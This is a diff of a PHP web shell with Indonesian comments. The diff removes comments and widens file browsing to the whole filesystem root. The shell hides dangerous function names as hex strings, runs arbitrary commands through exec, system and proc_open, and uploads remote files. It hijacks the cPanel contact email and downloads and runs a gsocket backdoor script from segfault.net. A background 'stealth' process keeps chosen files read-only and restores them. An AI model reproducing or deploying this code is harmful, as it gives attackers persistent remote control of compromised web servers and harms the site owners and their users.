@@ -16,7 +16,6 @@ function login_shell($error_message = "")
             $error_html = '';
         }
 
-        // HTML dan CSS untuk tampilan login
         echo '
         <!DOCTYPE html>
         <html lang="en">
@@ -153,7 +152,7 @@ function login_shell($error_message = "")
         </body>
         </html>';
     }
-    exit; // Penting: hentikan eksekusi skrip setelah menampilkan login
+    exit;
 }
 
 $session_key = md5('secret_key_' . $_SERVER['HTTP_HOST']);
@@ -173,12 +172,9 @@ if (!isset($_SESSION[$session_key])) {
     }
 }
 
-// =================================================================
-// FUNGSI ENCODE/DECODE KUSTOM
-// =================================================================
 function E($input)
 {
-    $prefix = "\x30\x78"; // "0x"
+    $prefix = "\x30\x78";
     if (!is_string($input)) {
         return false;
     }
@@ -187,7 +183,7 @@ function E($input)
 
 function D($encoded)
 {
-    $prefix = "\x30\x78"; // "0x"
+    $prefix = "\x30\x78";
     if (!is_string($encoded)) {
         return false;
     }
@@ -195,45 +191,41 @@ function D($encoded)
         return false;
     }
     $hex = substr($encoded, strlen($prefix));
-    if (strlen($hex) % 2 !== 0 || !preg_match("/^[0-9a-fA-F]+$/", $hex)) { // '/^[0-9a-fA-F]+$/'
+    if (strlen($hex) % 2 !== 0 || !preg_match("/^[0-9a-fA-F]+$/", $hex)) { 
         return false;
     }
     return hex2bin($hex);
 }
 
-// =================================================================
-// FUNGSI ARRAY YANG DI ENCODE
-// =================================================================
 $Array = [
-    // --- Fungsi Awal ---
-    "0x676574637764", // 0: getcwd
-    "0x6368646972", // 1: chdir
-    "0x7363616e646972", // 2: scandir
-    "0x7068705f756e616d65", // 3: php_uname (UNUSED)
-    "0x69735f646972", // 4: is_dir
-    "0x69735f66696c65", // 5: is_file
-    "0x66696c656f776e6572", // 6: fileowner (UNUSED)
-    "0x66696c657065726d73", // 7: fileperms
-    "0x65786563", // 8: exec
-    "0x7368656c6c5f65786563", // 9: shell_exec
-    "0x7061737374687275", // 10: passthru
-    "0x73797374656d", // 11: system
-    "0x70726f635f6f70656e", // 12: proc_open
-    "0x73747265616d5f6765745f636f6e74656e7473", // 13: stream_get_contents
-    "0x66636c6f7365", // 14: fclose
-    "0x70726f635f636c6f7365", // 15: proc_close
-    "0x66696c655f6765745f636f6e74656e7473", // 16: file_get_contents
-    "0x66696c655f7075745f636f6e74656e7473", // 17: file_put_contents
-    "0x69735f7265616461626c65", // 18: is_readable
-    "0x69735f7772697461626c65", // 19: is_writable
-    "0x66696c6573697a65", // 20: filesize
-    "0x756e6c696e6b", // 21: unlink
-    "0x726d646972", // 22: rmdir
-    "0x6d6b646972", // 23: mkdir
-    "0x72656e616d65", // 24: rename
-    "0x63686d6f64", // 25: chmod
-    "0x746f756368", // 26: touch
-    "0x66696c655f657869737473" // 27: file_exists
+    "0x676574637764",
+    "0x6368646972",
+    "0x7363616e646972",
+    "0x7068705f756e616d65",
+    "0x69735f646972",
+    "0x69735f66696c65",
+    "0x66696c656f776e6572",
+    "0x66696c657065726d73",
+    "0x65786563",
+    "0x7368656c6c5f65786563",
+    "0x7061737374687275",
+    "0x73797374656d",
+    "0x70726f635f6f70656e",
+    "0x73747265616d5f6765745f636f6e74656e7473",
+    "0x66636c6f7365",
+    "0x70726f635f636c6f7365",
+    "0x66696c655f6765745f636f6e74656e7473",
+    "0x66696c655f7075745f636f6e74656e7473",
+    "0x69735f7265616461626c65",
+    "0x69735f7772697461626c65",
+    "0x66696c6573697a65",
+    "0x756e6c696e6b",
+    "0x726d646972",
+    "0x6d6b646972",
+    "0x72656e616d65",
+    "0x63686d6f64",
+    "0x746f756368",
+    "0x66696c655f657869737473"
 ];
 
 
@@ -242,34 +234,27 @@ for ($i = 0; $i < $hitung_array; $i++) {
     $A[] = D($Array[$i]);
 }
 
-
-// =================================================================
-// PENGATURAN & VALIDASI AWAL
-// =================================================================
 @set_time_limit(0);
 @error_reporting(E_ALL & ~E_NOTICE);
-
-$base_dir = realpath(gWD());
+$shell_dir = realpath(gWD());
+$base_dir = stristr(PHP_OS, 'WIN') ? realpath(gWD()) : '/';
 
 function is_binary($str)
 {
-    // A simplified check: if content is non-printable or null bytes, assume binary
     return preg_match('~[^\x20-\x7E\t\r\n]~', $str) > 0;
 }
 
 function is_path_safe($path, $base) {
     if (!$path || !is_string($path)) return false;
 
-    // Normalisasi path: pastikan root Windows berakhir dengan '\'
     if (stristr(PHP_OS, 'WIN')) {
         if (preg_match('/^[A-Za-z]:$/', $path)) {
-            $path .= '\\'; // Ubah "C:" jadi "C:\"
+            $path .= '\\';
         }
     }
 
     $real_path = realpath($path);
     if ($real_path === false) {
-        // Jika realpath gagal, cek apakah ini path root yang valid
         if (stristr(PHP_OS, 'WIN')) {
             if (preg_match('/^[A-Za-z]:\\\\$/', $path)) {
                 $real_path = $path;
@@ -282,19 +267,17 @@ function is_path_safe($path, $base) {
         if ($real_path === false) return false;
     }
 
-    // Izinkan akses ke base_dir dan semua subdirektori
+    if (!stristr(PHP_OS, 'WIN') && $real_path === '/') {
+        return true;
+    }
+
     if (strncmp($real_path, $base, strlen($base)) === 0) {
         return true;
     }
 
-    // Izinkan akses eksplisit ke root filesystem jika base_dir juga di root
     if (stristr(PHP_OS, 'WIN')) {
         $base_drive = substr($base, 0, 3); // C:\
         if (substr($real_path, 0, 3) === $base_drive) {
-            return true;
-        }
-    } else {
-        if ($real_path === '/' && $base === '/') {
             return true;
         }
     }
@@ -302,9 +285,6 @@ function is_path_safe($path, $base) {
     return false;
 }
 
-// =================================================================
-// HANDLE FUNCTION UMUM
-// =================================================================
 function gWD()
 {
     return $GLOBALS['A'][0]();
@@ -335,9 +315,9 @@ function c($cmd)
         return $output;
     } elseif (function_exists($A[12])) {
         $descriptorspec = [
-            0 => ["pipe", "r"], // stdin
-            1 => ["pipe", "w"], // stdout
-            2 => ["pipe", "w"]  // stderr
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["pipe", "w"]
         ];
         $process = $A[12]($cmd, $descriptorspec, $pipes);
         if (is_resource($process)) {
@@ -355,9 +335,6 @@ function c($cmd)
     }
 }
 
-// =================================================================
-// ===== FUNGSI BARU UNTUK HAPUS FOLDER REKURSIF (FIXED) ============
-// =================================================================
 function delete_recursive($dir)
 {
     global $A;
@@ -382,15 +359,9 @@ function delete_recursive($dir)
     return $success;
 }
 
-
-// =================================================================
-// HANDLER UNTUK AKSI (DOWNLOAD, GET_CONTENT, SAVE)
-// =================================================================
-
 if (isset($_GET['action']) && $_GET['action'] === 'download') {
     $decoded_path = D($_GET['path']);
     $file_to_download_basename = basename(D($_GET['file']));
-    // Ensure `D` decodes the full path correctly if it's the full path being passed, or reconstruct from parts
     $file_path = rtrim($decoded_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_download_basename;
 
 
@@ -465,26 +436,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_file'])) {
     exit();
 }
 
-
-// =================================================================
-// PATH UTAMA DAN HANDLER POST (CREATE, DELETE, RENAME, CHMOD, UPLOAD)
-// =================================================================
-
-$path_encoded = $_GET['path'] ?? E($base_dir);
+$path_encoded = $_GET['path'] ?? E($shell_dir);
 $path = D($path_encoded);
 
 if ($path === false || !is_string($path)) {
     $path = $base_dir;
 } else {
-    // Normalisasi root Windows
     if (stristr(PHP_OS, 'WIN') && preg_match('/^[A-Za-z]:$/', $path)) {
         $path .= '\\';
     }
     if (!is_path_safe($path, $base_dir)) {
         $path = $base_dir;
     } else {
-        // Gunakan $path asli jika aman, jangan selalu pakai realpath()
-        // karena realpath() bisa fail di root
         $path = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
     }
 }
@@ -546,7 +509,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $message = 'Error: Could not delete folder. Check permissions.';
                 }
             } else {
-                // It's a file
                 if ($A[21]($file_to_delete)) {
                     $message = 'File deleted successfully.';
                     $status = 'success';
@@ -598,34 +560,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $message = 'Error locking file (Windows): ' . $cmd_result;
             }
         } else {
-            // =================================================================
-            // ===== FIXED OBFUSCATED LINUX FILE LOCK LOGIC ====================
-            // =================================================================
             $encoded_handler_template_fixed = '<?php @ini_set("max_execution_time", 0); sleep(1); $file_to_lock = "__FILE_TO_LOCK__"; $backup_file = "__BACKUP_FILE__"; $parent_dir = "__PARENT_DIR__"; while(True){ if(!@file_exists($file_to_lock)){ @file_put_contents($file_to_lock, @file_get_contents($backup_file)); @chmod($file_to_lock, 0444); } if((@fileperms($file_to_lock) & 0777) !== 0444){ @chmod($file_to_lock, 0444); } if(@is_dir($parent_dir)){ if((@fileperms($parent_dir) & 0777) !== 0555){ @chmod($parent_dir, 0555); } } @sleep(1); } ?>';
             
             $temp_dir = sys_get_temp_dir() ?: "/tmp";
             $backup_file = $temp_dir . DIRECTORY_SEPARATOR . md5($file_to_lock . "bak") . ".bak";
             $handler_script = $temp_dir . DIRECTORY_SEPARATOR . md5("handler" . $file_to_lock) . ".php";
 
-            // 1. Create a backup of the original file content
             if (@$A[17]($backup_file, @$A[16]($file_to_lock))) {
-                // 2. Prepare the monitor script content
                 $final_script = str_replace(
                     ['__FILE_TO_LOCK__', '__BACKUP_FILE__', '__PARENT_DIR__'],
                     [addslashes($file_to_lock), addslashes($backup_file), addslashes($current_path)],
                     $encoded_handler_template_fixed
                 );
                 
-                // 3. Write the monitor script to a temporary file
                 if (@$A[17]($handler_script, $final_script)) {
-                    // 4. Set initial 444 perm (read-only)
                     @$A[25]($file_to_lock, 0444);
                     
-                    // 5. Execute the monitor script in the background
                     $full_command = "nohup php " . escapeshellarg($handler_script) . " > /dev/null 2>&1 &";
-                    $cmd_result = c($full_command); // Execute command
+                    $cmd_result = c($full_command);
                     
-                    // The command 'nohup ... &' is expected to be successful and return quickly/empty
                     $message = 'File locked successfully (Stealth Mode Monitor Activated).';
                     $status = 'success';
                     
@@ -638,12 +591,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     } elseif (isset($_POST['mass_unlock_action'])) {
         if (stristr(PHP_OS, 'WIN')) {
-            // Attempt to remove system/hidden/read-only attributes from all files in the directory
             $cmd_result = c("attrib -r -s -h " . escapeshellarg($current_path . DIRECTORY_SEPARATOR . "*"));
             $message = 'Detected OS: Windows. Successfully attempted to unlock files. ' . ($cmd_result ? "Attribution output: " . $cmd_result : "");
             $status = 'success';
         } else {
-            // Terminate all instances of the monitor script
             $kill_cmd = 'pkill -f "php ' . preg_quote(sys_get_temp_dir() ?: "/tmp", '/') . '/*handler*"';
             $cmd_result = c($kill_cmd);
             $message = 'Attempted to terminate all file lock processes. You may need to manually restore file permissions (e.g., chmod 0755).';
@@ -658,17 +609,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $url_socket = "https://nossl.segfault.net/deploy-all.sh"; 
             $script_path = $systmpdir . "/sock.sh";
             
-            // Fetch the script
             $script_content = @$A[16]($url_socket);
             if ($script_content === false) {
                  $message = 'Error: Could not fetch gsocket script. Check `allow_url_fopen` or network access.';
             } else {
-                // Save the script
                 if (@$A[17]($script_path, $script_content) !== false) {
-                    // Make it executable
                     @chmod($script_path, 0755);
                     
-                    // Execute the script
                     $install_soc = c("bash -c \"{$script_path}\" 2>&1");
                     
                     if (stristr($install_soc, 'Error') === false && stristr($install_soc, 'failed') === false) {
@@ -685,7 +632,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } elseif (isset($_POST['email'])) {
         $email = $_POST['email'];
         $data_in_fi = "email: $email\n";
-        // Fixed path construction: DOCUMENT_ROOT is the absolute path to the web root
         $contactin = $_SERVER['DOCUMENT_ROOT'] . "/.cpanel/contactinfo";
         
         if (file_exists(dirname($contactin))) {
@@ -736,7 +682,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $message = 'Error: Remote file fetching is disabled on this server (`allow_url_fopen` is off).';
                 $status = 'error';
             } else {
-                // Use copy() for potentially better resource handling and error reporting
                 if (@copy($remote_url, $destination_path)) {
                     $message = 'File remotely uploaded successfully as ' . htmlspecialchars($local_name) . '.';
                     $status = 'success';
@@ -748,7 +693,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
     
-    // Fallback if no specific action uses header, necessary for file/folder creation/other
     if (!empty($message) && !isset($_POST['save_file'])) {
         header("Location: ?path=" . $current_path_encoded . "&msg=" . urlencode($message) . "&status=" . $status);
         exit();
@@ -756,13 +700,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 
 function sanitize_filename($filename) {
-    // Remove anything that isn't a letter, number, dot, underscore, or hyphen
     return preg_replace('/[^A-Za-z0-9\-\._]/', '', $filename);
 }
 
-// =================================================================
-// PROSES TERMINAL & INFO SERVER
-// =================================================================
 $server_os = PHP_OS;
 $php_version = PHP_VERSION;
 $server_software = $_SERVER["SERVER_SOFTWARE"] ?? 'Unknown';
@@ -772,13 +712,9 @@ $server_time = date('Y-m-d H:i:s');
 $output = '';
 if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
-    // For command execution, we want to ensure we don't accidentally execute a file/folder action post
     $output = c($cmd);
 }
 
-// =================================================================
-// LOGIKA TAMPILAN (FRONT-END)
-// =================================================================
 $files = @scandir($path) ?: [];
 
 if ($files !== false) {
@@ -788,17 +724,14 @@ if ($files !== false) {
         $aIsDir = @$A[4]($aPath);
         $bIsDir = @$A[4]($bPath);
         
-        // Always place '.' first, then '..'
         if ($a === '.') return -1;
         if ($b === '.') return 1;
         if ($a === '..') return -1;
         if ($b === '..') return 1;
 
-        // Directories before files
         if ($aIsDir && !$bIsDir) return -1;
         if (!$aIsDir && $bIsDir) return 1;
         
-        // Alphabetical sort for same type
         return strcasecmp($a, $b);
     });
 }
@@ -831,15 +764,13 @@ if ($files !== false) {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             font-size: 16px;
             line-height: 1.5;
-            /* PERBAIKAN 1: Mengurangi padding body global dari 40px menjadi 20px */
             padding: 12px 0; 
             box-sizing: border-box;
         }
         
         .container {
             max-width: 1360px;
-            margin: 0 auto; /* Tengah-kan konten */
-            /* Padding vertikal 20px, padding horizontal 40px */
+            margin: 0 auto;
             padding: 10px 40px; 
             background-color: #242530ff;
             border-radius: 10px;
@@ -851,13 +782,10 @@ if ($files !== false) {
         }
         
         @media (max-width: 640px) {
-            /* Aturan untuk mobile */
             body {
-                /* PERBAIKAN 3: Padding body di mobile dikurangi agar container bisa diatur dengan margin */
                 padding: 10px 0; 
             }
             .container {
-                /* PERBAIKAN 2: Menggunakan margin vertikal 10px untuk memberikan jarak di atas dan bawah */
                 margin: 0 10px 10px 10px; 
                 padding: 15px;
                 max-width: none;
@@ -1122,7 +1050,6 @@ if ($files !== false) {
             color: #e3f2fd;
         }
         
-        /* >>> MODIFIKASI: Tautan nama file menjadi putih (tetap ada warna hover dan icon) <<< */
         .file-manager td a {
             color: #FFFFFF !important;
             text-decoration: none;
@@ -1136,19 +1063,17 @@ if ($files !== false) {
         }
         
         .file-manager td a i {
-            margin-right: 8px; /* Atur jarak di sebelah kanan untuk semua icon di kolom nama file */
+            margin-right: 8px;
         }
 
         .dir-icon {
             color: #ffc107; 
         }
 
-        /* *Icon* file biasa */
         .file-manager td a .fa-regular.fa-file {
             color: #b0bec5;
         }
         
-        /* >>> MODIFIKASI: Menambahkan kelas untuk cursor pointer pada tautan file <<< */
         .file-link-file {
             cursor: pointer;
         }
@@ -1347,7 +1272,6 @@ if ($files !== false) {
                             $relative = ltrim($real_path, '/');
                             $segments = $relative === '' ? [] : array_filter(explode('/', $relative));
                             $build = '/';
-
                             foreach ($segments as $seg) {
                                 $build .= ($build === '/' ? '' : '/') . $seg;
                                 if ($build === $real_path) {
@@ -1370,9 +1294,9 @@ if ($files !== false) {
                 </div>
             </div>
             <div style="flex-shrink: 0; margin-top: 5px;">
-            <a href="?path=<?php echo E($base_dir); ?>" style="color:#4fc3f7; font-weight:600; background:#37474f; padding:5px 10px; border-radius:6px; text-decoration:none;">
-                <i class="fa-solid fa-house"></i> Home Shell
-            </a>
+            <a href="?path=<?php echo E($shell_dir); ?>" style="color:#4fc3f7; font-weight:600; background:#37474f; padding:5px 10px; border-radius:6px; text-decoration:none;">
+                    <i class="fa-solid fa-house"></i> Home Shell
+                </a>
         </div>
         </nav>
 
